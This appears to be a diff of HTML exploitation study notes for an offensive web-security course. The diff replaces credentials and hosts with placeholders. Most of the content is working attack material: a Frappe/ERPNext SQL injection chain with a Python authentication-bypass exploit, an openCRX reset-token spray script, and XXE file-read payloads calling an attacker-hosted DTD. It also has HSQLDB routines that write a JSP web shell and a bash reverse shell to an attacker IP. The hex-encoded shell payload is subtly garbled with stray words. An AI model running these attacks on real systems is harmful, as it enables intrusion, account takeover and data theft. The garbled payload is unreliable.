 SELECT `doctype`, `name`, `content`, `title`, `route`
   FROM `__global_search`
-  WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('"offsec"' IN BOOLEAN MODE)
+  WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('"[search-term]"' IN BOOLEAN MODE)
   LIMIT 20 OFFSET 0</code></pre>
 
-<pre><code class="language-sql">-- Query with scope=offsec_scope
+<pre><code class="language-sql">-- Query with scope=[scope-prefix]
 SELECT `doctype`, `name`, `content`, `title`, `route`
   FROM `__global_search`
-  WHERE `published` = 1 AND  `route` like "offsec_scope%" AND MATCH(`content`) AGAINST ('"offsec"' IN BOOLEAN MODE)
+  WHERE `published` = 1 AND  `route` like "[scope-prefix]%" AND MATCH(`content`) AGAINST ('"[search-term]"' IN BOOLEAN MODE)
   LIMIT 20 OFFSET 0</code></pre>
 
 <pre><code class="language-bash"># Initial UNION injection - terminate double quote, inject UNION, comment out rest
 # Payload for scope parameter:
-# offsec_scope" UNION ALL SELECT 1,2,3,4,5#
+# [scope-prefix]" UNION ALL SELECT 1,2,3,4,5#
 
 # Burp request (POST to /api/method/frappe.utils.global_search.web_search):
-cmd=frappe.utils.global_search.web_search&amp;text=offsec&amp;scope=offsec_scope" UNION ALL SELECT 1,2,3,4,5#</code></pre>
+cmd=frappe.utils.global_search.web_search&amp;text=[search-term]&amp;scope=[scope-prefix]" UNION ALL SELECT 1,2,3,4,5#</code></pre>
 
 <pre><code class="language-sql">-- Resulting injected query
 SELECT `doctype`, `name`, `content`, `title`, `route`
   FROM `__global_search`
-  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,5#%" AND MATCH(`content`) AGAINST ('"offsec"' IN BOOLEAN MODE)
+  WHERE `published` = 1 AND  `route` like "[scope-prefix]" UNION ALL SELECT 1,2,3,4,5#%" AND MATCH(`content`) AGAINST ('"[search-term]"' IN BOOLEAN MODE)
   LIMIT 20 OFFSET 0</code></pre>
 
 <pre><code class="language-json">// Response confirms injection - numbers map to column positions
@@ -3402,7 +3402,7 @@ SELECT `doctype`, `name`, `content`, `title`, `route`
 
 <ul class="methodology-checklist">
   <li><label><input type="checkbox"> Extract database version</label></li>
-  <li><label><input type="checkbox"> scope payload: offsec_scope" UNION ALL SELECT 1,2,3,4,@@version#</label></li>
+  <li><label><input type="checkbox"> scope payload: [scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</label></li>
   <li><label><input type="checkbox"> Response: "route":"10.2.24-MariaDB-10.2.24+maria~xenial-log"</label></li>
 </ul>
 
@@ -3410,12 +3410,12 @@ SELECT `doctype`, `name`, `content`, `title`, `route`
 <p>Extracting string data from other tables triggers a "Illegal mix of collations for operation 'UNION'" error because the <code>__global_search</code> table uses a different collation than the target table. Extract the collation via <code>information_schema</code> and force it with <code>COLLATE</code>.</p>
 
 <pre><code class="language-sql">-- Extract collation of the __global_search.name column
--- scope payload: offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#
+-- scope payload: [scope-prefix]" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#
 -- Response: "route":"utf8mb4_general_ci"</code></pre>
 
 <pre><code class="language-sql">-- Extract users from __Auth with forced collation
--- scope payload: offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
--- Response includes: "route":"Administrator" and "route":"zeljka.k@randomdomain.com"</code></pre>
+-- scope payload: [scope-prefix]" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
+-- Response includes: "route":"Administrator" and "route":"[admin-email]"</code></pre>
 
 <h4 id="oswe-erpnext-admin-info">7.4.3 Obtaining Admin User Information</h4>
 <p>The Frappe <code>__Auth</code> table stores usernames (in the <code>name</code> column) with PBKDF2-hashed passwords. Rather than cracking hashes, we target the password reset mechanism. The reset key is stored in the <code>tabUser</code> table, which we locate by submitting a reset for a token email and grepping the MariaDB query log.</p>
@@ -3425,27 +3425,27 @@ sudo tail -f /var/log/mysql/mysql.log | grep token_searchForUserTable
 # Result: select * from `tabUser` where `name` = 'token_searchForUserTable@mail.com'</code></pre>
 
 <pre><code class="language-sql">-- Enumerate tabUser columns to find the reset key column
--- scope payload: offsec_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#
+-- scope payload: [scope-prefix]" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#
 -- Response includes: "route":"reset_password_key"</code></pre>
 
 <h4 id="oswe-erpnext-password-reset">7.4.4 Resetting the Admin Password</h4>
 <p>Trigger a password reset for the admin user, then extract the <code>reset_password_key</code> via the SQL injection. The reset link format is <code>/update-password?key=[reset_key]</code>. Visiting this URL with the extracted key allows setting a new password.</p>
 
 <pre><code class="language-sql">-- Extract reset_password_key with name for the correct user
--- scope payload: offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#
+-- scope payload: [scope-prefix]" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#
 
 -- Response:
 -- {"message":[
 --   {"doctype":"Administrator","route":null, ...},
 --   {"doctype":"Guest","route":null, ...},
---   {"doctype":"zeljka.k@randomdomain.com","route":"aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0"}
+--   {"doctype":"[admin-email]","route":"aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0"}
 -- ]}</code></pre>
 
 <pre><code class="language-python"># Full authentication bypass exploit
 import requests
 
 target = "http://[target-ip]:8000"
-admin_email = "zeljka.k@randomdomain.com"
+admin_email = "[admin-email]"
 
 # Step 1: Trigger password reset for admin user
 print("[*] Triggering password reset...")
@@ -3456,11 +3456,11 @@ requests.get(f"{target}/api/method/login", params={
 
 # Step 2: Extract reset key via UNION SQLi on web_search scope param
 print("[*] Extracting reset key via SQLi...")
-sqli_payload = 'offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#'
+sqli_payload = '[scope-prefix]" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#'
 
 r = requests.post(f"{target}/api/method/frappe.utils.global_search.web_search", data={
     "cmd": "frappe.utils.global_search.web_search",
-    "text": "offsec",
+    "text": "[search-term]",
     "scope": sqli_payload
 })
 
@@ -3509,8 +3509,8 @@ def reset_password(self, send_email=False, password_expired=False):
   </li>
   <li>
     <label><input type="checkbox"> Confirm injection by POSTing to <code>/api/method/frappe.utils.global_search.web_search</code> with a UNION payload that terminates the LIKE clause</label>
-    <pre><code class="language-bash">curl -X POST http://[target-ip]:8080/api/method/frappe.utils.global_search.web_search \
-  -d 'text=test&amp;scope=offsec_scope" UNION ALL SELECT 1,2,3,4,5#'</code></pre>
+    <pre><code class="language-bash">curl -X POST http://[target-ip]:[port]/api/method/frappe.utils.global_search.web_search \
+  -d 'text=[search-term]&amp;scope=[scope-prefix]" UNION ALL SELECT 1,2,3,4,5#'</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Map response column positions: doctype=1, name=2, content=3, title=4, route=5</label>
@@ -3518,16 +3518,16 @@ def reset_password(self, send_email=False, password_expired=False):
   <li>
     <label><input type="checkbox"> Extract database version to confirm injection</label>
     <pre><code class="language-sql">-- scope payload:
--- offsec_scope" UNION ALL SELECT 1,2,3,4,@@version#</code></pre>
+-- [scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Resolve collation mismatch when extracting from other tables</label>
     <pre><code class="language-sql">-- Extract collation:
--- offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#</code></pre>
+-- [scope-prefix]" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Extract usernames from <code>__Auth</code> table with forced collation</label>
-    <pre><code class="language-sql">-- offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#</code></pre>
+    <pre><code class="language-sql">-- [scope-prefix]" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Discover password reset storage table by monitoring MariaDB query log during a reset</label>
@@ -3538,7 +3538,7 @@ def reset_password(self, send_email=False, password_expired=False):
   </li>
   <li>
     <label><input type="checkbox"> Trigger password reset for admin user and extract the reset key via SQLi</label>
-    <pre><code class="language-sql">-- offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#</code></pre>
+    <pre><code class="language-sql">-- [scope-prefix]" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Navigate to <code>/update-password?key=[reset_key]</code> to set new admin password</label>
@@ -3714,12 +3714,12 @@ frappe@ubuntu:~$ ls -lh /tmp/pwned
   <li><label><input type="checkbox" data-id="oswe-7-2"> Search guest-whitelisted functions for direct SQL queries (breaks MVC pattern)</label></li>
   <li><label><input type="checkbox" data-id="oswe-7-3"> Identify SQL injection in <code>web_search</code> function (<code>scope</code>, <code>limit</code>, <code>start</code> unescaped)</label></li>
   <li><label><input type="checkbox" data-id="oswe-7-4"> Confirm UNION injection via scope parameter and extract <code>@@version</code></label>
-    <pre><code class="language-bash">scope=offsec_scope" UNION ALL SELECT 1,2,3,4,@@version#</code></pre>
+    <pre><code class="language-bash">scope=[scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-7-5"> Resolve collation mismatch by extracting collation from <code>information_schema</code></label></li>
   <li><label><input type="checkbox" data-id="oswe-7-6"> Extract admin email from <code>__Auth</code> table and trigger password reset</label></li>
   <li><label><input type="checkbox" data-id="oswe-7-7"> Extract <code>reset_password_key</code> from <code>tabUser</code> via SQLi and reset admin password</label>
-    <pre><code class="language-sql">scope=offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#</code></pre>
+    <pre><code class="language-sql">scope=[scope-prefix]" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-7-8"> As admin, create email template with <code>{{ 7*7 }}</code> to confirm SSTI</label></li>
   <li><label><input type="checkbox" data-id="oswe-7-9"> Bypass <code>.__</code> filter using Jinja <code>attr()</code> filter and <code>{% set %}</code> variables</label></li>
@@ -3755,12 +3755,12 @@ frappe@ubuntu:~$ ls -lh /tmp/pwned
 <p>openCRX is packaged as an EAR file containing several WAR files. The common JAR libraries live in <code>/APP-INF/lib</code>. The main web application is <code>opencrx-core-CRX.war</code>, with core logic in <code>opencrx-kernel.jar</code>.</p>
 
 <pre><code class="language-bash"># SSH to the server and examine the structure
-ssh student@[target-ip]
+ssh [username]@[target-ip]
 cd crx/apache-tomee-plus-7.0.5/
 tree -L 3
 
 # Copy the EAR file to Kali for analysis
-scp student@[target-ip]:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
+scp [username]@[target-ip]:~/[app-dir]/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
 unzip -q opencrx-core-CRX.ear -d opencrx</code></pre>
 
 <p>The <code>META-INF/application.xml</code> file within the EAR specifies library locations. The <code>&lt;library-directory&gt;</code> element points to <code>APP-INF/lib</code> where <code>opencrx-kernel.jar</code> resides.</p>
@@ -3781,11 +3781,11 @@ unzip -q opencrx-core-CRX.ear -d opencrx</code></pre>
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> SSH into the openCRX VM and locate the application directory</label>
-<pre><code class="language-bash">ssh student@[target-ip]
+<pre><code class="language-bash">ssh [username]@[target-ip]
 cd crx/apache-tomee-plus-7.0.5/
 tree -L 3</code></pre></li>
 <li><label><input type="checkbox"> Copy the EAR file to Kali and extract for source code analysis</label>
-<pre><code class="language-bash">scp student@[target-ip]:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
+<pre><code class="language-bash">scp [username]@[target-ip]:~/[app-dir]/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
 unzip -q opencrx-core-CRX.ear -d opencrx</code></pre></li>
 <li><label><input type="checkbox"> Identify the core JAR from <code>META-INF/application.xml</code> and extract it</label>
 <pre><code class="language-bash">cat opencrx/META-INF/application.xml | grep library-directory
@@ -3923,8 +3923,8 @@ No match.</code></pre>
 
 <pre><code class="language-bash"># Capture timestamps around the reset request
 date +%s%3N &amp;&amp; \
-curl -s -i -X 'POST' --data-binary 'id=guest' \
-  'http://[target-ip]:8080/opencrx-core-CRX/RequestPasswordReset.jsp' &amp;&amp; \
+curl -s -i -X 'POST' --data-binary 'id=[username]' \
+  'http://[target-ip]:[port]/opencrx-core-CRX/RequestPasswordReset.jsp' &amp;&amp; \
 date +%s%3N
 
 # Example output:
@@ -4005,7 +4005,7 @@ parser.add_argument('-u', '--user', help='Username to target', required=True)
 parser.add_argument('-p', '--password', help='Password value to set', required=True)
 args = parser.parse_args()
 
-target = "http://[target-ip]:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
+target = "http://[target-ip]:[port]/opencrx-core-CRX/PasswordResetConfirm.jsp"
 
 print("Starting token spray. Standby.")
 with open("tokens.txt", "r") as f:
@@ -4024,7 +4024,7 @@ with open("tokens.txt", "r") as f:
             break</code></pre>
 
 <pre><code class="language-bash"># Run the reset script
-python3 OpenCRXReset.py -u guest -p password
+python3 OpenCRXReset.py -u [username] -p [new-password]
 # Starting token spray. Standby.
 # Successful reset with token: yzs4pCxiRTym9Srs6OrzUY0b9HtEnDK8SrPtjBUe</code></pre>
 
@@ -4032,21 +4032,21 @@ python3 OpenCRXReset.py -u guest -p password
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Identify the password reset endpoint and test with known default accounts (<code>guest</code>, <code>admin-Standard</code>, <code>admin-Root</code>)</label>
-<pre><code class="language-bash">curl -s -X POST --data-binary 'id=guest' \
-  'http://[target-ip]:8080/opencrx-core-CRX/RequestPasswordReset.jsp'</code></pre></li>
+<pre><code class="language-bash">curl -s -X POST --data-binary 'id=[username]' \
+  'http://[target-ip]:[port]/opencrx-core-CRX/RequestPasswordReset.jsp'</code></pre></li>
 <li><label><input type="checkbox"> Trace the reset code path: <code>RequestPasswordReset.jsp</code> → <code>UserHomeImpl.requestPasswordReset()</code> → <code>UserHomes.requestPasswordReset()</code> → <code>Utils.getRandomBase62()</code></label></li>
 <li><label><input type="checkbox"> Confirm the PRNG uses <code>java.util.Random</code> seeded with <code>System.currentTimeMillis()</code> (not <code>SecureRandom</code>)</label></li>
 <li><label><input type="checkbox"> Capture timestamps before and after the reset request to bound the seed range</label>
 <pre><code class="language-bash">date +%s%3N && \
-curl -s -i -X POST --data-binary 'id=guest' \
-  'http://[target-ip]:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && \
+curl -s -i -X POST --data-binary 'id=[username]' \
+  'http://[target-ip]:[port]/opencrx-core-CRX/RequestPasswordReset.jsp' && \
 date +%s%3N</code></pre></li>
 <li><label><input type="checkbox"> Compile and run the token generator to produce candidate tokens for the captured range</label>
 <pre><code class="language-bash">javac OpenCRXToken.java
 java OpenCRXToken [start_ms] [end_ms] > tokens.txt
 wc -l tokens.txt</code></pre></li>
 <li><label><input type="checkbox"> Spray tokens against <code>PasswordResetConfirm.jsp</code> to reset the target password</label>
-<pre><code class="language-bash">python3 OpenCRXReset.py -u guest -p password</code></pre></li>
+<pre><code class="language-bash">python3 OpenCRXReset.py -u [username] -p [new-password]</code></pre></li>
 <li><label><input type="checkbox"> Log in with the new credentials and confirm authenticated access</label></li>
 </ul>
 
@@ -4095,8 +4095,8 @@ wc -l tokens.txt</code></pre></li>
 
 <pre><code class="language-bash"># Send the XXE payload via curl (through Burp or directly)
 curl -X POST \
-  'http://[target-ip]:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account' \
-  -u guest:password \
+  'http://[target-ip]:[port]/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account' \
+  -u [username]:[password] \
   -H 'Content-Type: application/xml' \
   -d '&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE data [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
@@ -4119,7 +4119,7 @@ sudo systemctl start apache2</code></pre>
 &lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE data [
 &lt;!ENTITY % start "&lt;![CDATA["&gt;
-&lt;!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml"&gt;
+&lt;!ENTITY % file SYSTEM "file:///home/[username]/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml"&gt;
 &lt;!ENTITY % end "]]&gt;"&gt;
 &lt;!ENTITY % dtd SYSTEM "http://[attacker-ip]/wrapper.dtd"&gt;
 %dtd;
@@ -4135,7 +4135,7 @@ sudo systemctl start apache2</code></pre>
 <p>In Java, the <code>File</code> class can reference directories. Modifying the XXE payload to point at a directory returns a directory listing. Use this to enumerate the filesystem for credentials and configuration files.</p>
 
 <pre><code class="language-xml">&lt;!-- Read directory listing --&gt;
-&lt;!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/"&gt;</code></pre>
+&lt;!ENTITY % file SYSTEM "file:///home/[username]/crx/data/hsqldb/"&gt;</code></pre>
 
 
 <h4>Methodology</h4>
@@ -4143,15 +4143,15 @@ sudo systemctl start apache2</code></pre>
 <li><label><input type="checkbox"> Identify XML-accepting endpoints in the openCRX REST API (Swagger documentation at <code>/opencrx-rest-CRX/</code>)</label></li>
 <li><label><input type="checkbox"> Test internal entity parsing to confirm the XML parser processes DTDs</label>
 <pre><code class="language-bash">curl -X POST \
-  'http://[target-ip]:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account' \
-  -u guest:password -H 'Content-Type: application/xml' \
+  'http://[target-ip]:[port]/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account' \
+  -u [username]:[password] -H 'Content-Type: application/xml' \
   -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE d [&lt;!ENTITY t "test"&gt;]&gt;&lt;org.opencrx.kernel.account1.Contact&gt;&lt;lastName&gt;&amp;t;&lt;/lastName&gt;&lt;firstName&gt;Tom&lt;/firstName&gt;&lt;/org.opencrx.kernel.account1.Contact&gt;'</code></pre></li>
 <li><label><input type="checkbox"> Escalate to external entities to read <code>/etc/passwd</code> via <code>SYSTEM "file:///"</code></label></li>
 <li><label><input type="checkbox"> Use CDATA wrapping with an external DTD (<code>wrapper.dtd</code>) to read files containing XML characters</label>
 <pre><code class="language-bash"># Host wrapper.dtd: &lt;!ENTITY wrapper "%start;%file;%end;"&gt;
 sudo cp wrapper.dtd /var/www/html/ && sudo systemctl start apache2</code></pre></li>
 <li><label><input type="checkbox"> Enumerate directories via XXE (Java <code>File</code> class returns directory listings)</label>
-<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/"&gt;</code></pre></li>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///home/[username]/crx/data/hsqldb/"&gt;</code></pre></li>
 <li><label><input type="checkbox"> Extract HSQLDB credentials from <code>dbmanager.sh</code> discovered through directory enumeration</label></li>
 </ul>
 
@@ -4159,7 +4159,7 @@ sudo cp wrapper.dtd /var/www/html/ && sudo systemctl start apache2</code></pre><
 <p>Using the XXE directory enumeration, we discover HSQLDB database files and a <code>dbmanager.sh</code> script containing JDBC connection credentials. HSQLDB relies on ACLs or network-layer protections for access control — if the port is open and no ACLs are configured, we can connect remotely.</p>
 
 <h4 id="oswe-opencrx-hsqldb-creds">8.4.1 Discovering HSQLDB Credentials</h4>
-<p>The <code>dbmanager.sh</code> file (read via XXE with CDATA wrapping) reveals a JDBC connection string with username <code>sa</code> and password <code>manager99</code>. The <code>crx.properties</code> file shows no ACLs are defined.</p>
+<p>The <code>dbmanager.sh</code> file (read via XXE with CDATA wrapping) reveals a JDBC connection string with username <code>[db-user]</code> and password <code>[db-password]</code>. The <code>crx.properties</code> file shows no ACLs are defined.</p>
 
 <pre><code class="language-bash"># Verify HSQLDB port is open
 nmap -p 9001 [target-ip]
@@ -4169,8 +4169,8 @@ nmap -p 9001 [target-ip]
 # Connect using HSQLDB Database Manager GUI
 java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing \
   --url jdbc:hsqldb:hsql://[target-ip]:9001/CRX \
-  --user sa \
-  --password manager99</code></pre>
+  --user [db-user] \
+  --password [db-password]</code></pre>
 
 <h4 id="oswe-opencrx-jrt">8.4.2 Java Language Routines (JRT)</h4>
 <p>HSQLDB allows calling static Java methods from SQL using Java Language Routines. Functions return values and can be used in queries; procedures return void and are invoked with <code>CALL</code>. The method must be static, with parameters that map between Java and SQL types.</p>
@@ -4263,32 +4263,32 @@ CALL writeBytesToFilename(
   CAST('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a0a202020696628636d6420213d206e756c6c29207b0a20202020202053747472696e672073203d206e756c6c3b0a202020202020747279207b0a20202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020204275666665726564526561646572207349203d206e657720427566666572656452656164657228e6577twentieth496e70757453747265616d52656164657228702e676574496e7075745374726561sixth282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a20202020202020202065002e7072696e74537461636b547261636528293b0a2020202020207d0a2020207d0a253e0a0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e' AS VARBINARY(1024)));</code></pre>
 
 <pre><code class="language-bash"># Verify the web shell works
-curl 'http://[target-ip]:8080/opencrx-core-CRX/shell.jsp?cmd=hostname'
+curl 'http://[target-ip]:[port]/opencrx-core-CRX/shell.jsp?cmd=hostname'
 # &lt;pre&gt;
 # opencrx
 # &lt;/pre&gt;
 
 # Upgrade to a reverse shell
-curl 'http://[target-ip]:8080/opencrx-core-CRX/shell.jsp?cmd=bash+-c+bash+-i+>%26+/dev/tcp/[attacker-ip]/4444+0>%261'</code></pre>
+curl 'http://[target-ip]:[port]/opencrx-core-CRX/shell.jsp?cmd=bash+-c+bash+-i+>%26+/dev/tcp/[attacker-ip]/[listener-port]+0>%261'</code></pre>
 
 <h4 id="oswe-opencrx-methodology">Methodology</h4>
 <ul class="methodology-checklist">
   <li><label><input type="checkbox" data-id="oswe-8-0"> Extract EAR/WAR files from server and decompile with JD-GUI</label>
-    <pre><code class="language-bash">scp student@[target-ip]:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
+    <pre><code class="language-bash">scp [username]@[target-ip]:~/[app-dir]/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
 unzip -q opencrx-core-CRX.ear -d opencrx</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-8-1"> Trace password reset flow: JSP → UserHomeImpl → UserHomes.requestPasswordReset()</label></li>
   <li><label><input type="checkbox" data-id="oswe-8-2"> Identify weak PRNG: <code>java.util.Random</code> seeded with <code>System.currentTimeMillis()</code></label></li>
   <li><label><input type="checkbox" data-id="oswe-8-3"> Enumerate valid accounts via password reset error messages</label></li>
   <li><label><input type="checkbox" data-id="oswe-8-4"> Time the reset request with <code>date +%s%3N</code> before/after curl</label>
-    <pre><code class="language-bash">date +%s%3N &amp;&amp; curl -s -X POST --data-binary 'id=guest' \
-  'http://[target-ip]:8080/opencrx-core-CRX/RequestPasswordReset.jsp' &amp;&amp; date +%s%3N</code></pre>
+    <pre><code class="language-bash">date +%s%3N &amp;&amp; curl -s -X POST --data-binary 'id=[username]' \
+  'http://[target-ip]:[port]/opencrx-core-CRX/RequestPasswordReset.jsp' &amp;&amp; date +%s%3N</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-8-5"> Generate candidate tokens with OpenCRXToken.java for the captured time range</label>
     <pre><code class="language-bash">javac OpenCRXToken.java &amp;&amp; java OpenCRXToken [start] [stop] &gt; tokens.txt</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-8-6"> Spray tokens against PasswordResetConfirm.jsp to reset the password</label>
-    <pre><code class="language-bash">python3 OpenCRXReset.py -u guest -p password</code></pre>
+    <pre><code class="language-bash">python3 OpenCRXReset.py -u [username] -p [new-password]</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-8-7"> Test XML API endpoints for XXE with internal entity first, then external</label></li>
   <li><label><input type="checkbox" data-id="oswe-8-8"> Use CDATA wrapper DTD to read XML files without parser errors</label>
@@ -4298,7 +4298,7 @@ sudo systemctl start apache2</code></pre>
   <li><label><input type="checkbox" data-id="oswe-8-9"> Enumerate filesystem via XXE directory listings to find HSQLDB credentials</label></li>
   <li><label><input type="checkbox" data-id="oswe-8-10"> Connect to HSQLDB with discovered credentials</label>
     <pre><code class="language-bash">java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing \
-  --url jdbc:hsqldb:hsql://[target-ip]:9001/CRX --user sa --password manager99</code></pre>
+  --url jdbc:hsqldb:hsql://[target-ip]:9001/CRX --user [db-user] --password [db-password]</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-8-11"> Create JRT procedure for <code>writeBytesToFilename</code> and write JSP web shell</label></li>
   <li><label><input type="checkbox" data-id="oswe-8-12"> Access web shell and upgrade to interactive reverse shell</label></li>
@@ -4320,7 +4320,7 @@ sudo systemctl start apache2</code></pre>
 <thead><tr><th>URL</th><th>Username</th><th>Password</th></tr></thead>
 <tbody>
 <tr><td><code>https://[target-ip]/</code></td><td>-</td><td>-</td></tr>
-<tr><td><code>ssh://[target-ip]</code></td><td>student</td><td>studentlab</td></tr>
+<tr><td><code>ssh://[target-ip]</code></td><td>[username]</td><td>[password]</td></tr>
 </tbody>
 </table>
 
@@ -4329,7 +4329,7 @@ sudo systemctl start apache2</code></pre>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Access the openITCOCKPIT web interface at <code>https://[target-ip]/</code> and note the redirect to <code>/login/login</code></label></li>
 <li><label><input type="checkbox"> SSH into the target for later source analysis</label>
-<pre><code class="language-bash">ssh student@[target-ip]</code></pre></li>
+<pre><code class="language-bash">ssh [username]@[target-ip]</code></pre></li>
 <li><label><input type="checkbox"> Identify the exploit chain: DOM-based XSS (CVE-2020-10788) → session riding → WebSocket command injection (CVE-2020-10789/CVE-2020-10790)</label></li>
 <li><label><input type="checkbox"> Configure Burp Suite to proxy HTTPS traffic and populate the sitemap by browsing the application</label></li>
 </ul>
@@ -5012,7 +5012,7 @@ python3 wsclient.py --url wss://[target-ip]/sudo_server \
 <p>Standard command injection operators (<code>&amp;&amp;</code>, <code>||</code>, <code>;</code>) are blocked. However, the <code>check_http</code> command accepts a <code>-k</code> flag for custom HTTP headers, opening an injection vector through quoting inconsistencies.</p>
 
 <pre><code class="language-bash"># Use check_http to connect back and verify header control
-./check_http -I [attacker-ip] -p 8080
+./check_http -I [attacker-ip] -p [port]
 
 # Listener output:
 # GET / HTTP/1.0
@@ -5020,7 +5020,7 @@ python3 wsclient.py --url wss://[target-ip]/sudo_server \
 # Connection: close
 
 # Add a custom header with -k
-./check_http -I [attacker-ip] -p 8080 -k string1
+./check_http -I [attacker-ip] -p [port] -k string1
 
 # Listener output includes:
 # string1</code></pre>
@@ -5028,7 +5028,7 @@ python3 wsclient.py --url wss://[target-ip]/sudo_server \
 <p>Testing with single quotes reveals a critical injection point. When single-quoted arguments are passed, the closing quote escapes the command encapsulation, injecting into the parent <code>su</code> command that wraps user input.</p>
 
 <pre><code class="language-bash"># Single quote escapes into the su -c command wrapper
-./check_http -I [attacker-ip] -p 8080 -k 'string1 --help'
+./check_http -I [attacker-ip] -p [port] -k 'string1 --help'
 
 # Output: su command help message (not check_http help!)
 # Usage: su [options] [LOGIN]
@@ -5036,19 +5036,19 @@ python3 wsclient.py --url wss://[target-ip]/sudo_server \
 #   -c, --command COMMAND    pass COMMAND to the invoked shell
 
 # The server likely runs something like:
-# su someuser -c './check_http -I [attacker-ip] -p 8080 -k 'string1 --help''
+# su someuser -c './check_http -I [attacker-ip] -p [port] -k 'string1 --help''
 # The single quote breaks out of the -c argument encapsulation</code></pre>
 
 <pre><code class="language-bash"># Inject a new -c argument to execute arbitrary commands
-./check_http -I [attacker-ip] -p 8080 -k 'test -c 'echo 'hacked'
-# Output: hacked
+./check_http -I [attacker-ip] -p [port] -k 'test -c 'echo '[command-output]'
+# Output: [command-output]
 
 # Execute arbitrary commands
